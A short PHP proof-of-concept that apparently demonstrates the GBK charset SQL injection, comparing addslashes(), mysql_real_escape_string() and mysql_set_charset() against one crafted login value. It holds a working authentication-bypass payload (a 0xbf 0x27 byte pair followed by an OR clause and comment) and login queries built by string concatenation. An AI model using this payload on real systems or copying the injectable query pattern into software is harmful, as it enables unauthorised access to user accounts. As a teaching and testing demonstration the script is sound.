<?php
echo "PHP version: ".PHP_VERSION."\n";

mysql_connect('servername','username','password');
mysql_select_db("test");
mysql_query("SET NAMES GBK");

$_POST['username'] = chr(0xbf).chr(0x27).' OR username = username /*';
$_POST['password'] = 'guess';

$username = addslashes($_POST['username']);
$password = addslashes($_POST['password']);
$sql = "SELECT * FROM  users WHERE  username = '$username' AND password = '$password'";
$result = mysql_query($sql) or trigger_error(mysql_error().$sql);

var_dump(mysql_num_rows($result));
var_dump(mysql_client_encoding());

$username = mysql_real_escape_string($_POST['username']);
$password = mysql_real_escape_string($_POST['password']);
$sql = "SELECT * FROM  users WHERE  username = '$username' AND password = '$password'";
$result = mysql_query($sql) or trigger_error(mysql_error().$sql);

var_dump(mysql_num_rows($result));
var_dump(mysql_client_encoding());

mysql_set_charset("GBK");
$username = mysql_real_escape_string($_POST['username']);
$password = mysql_real_escape_string($_POST['password']);
$sql = "SELECT * FROM  users WHERE  username = '$username' AND password = '$password'";
$result = mysql_query($sql) or trigger_error(mysql_error().$sql);

var_dump(mysql_num_rows($result));
var_dump(mysql_client_encoding());

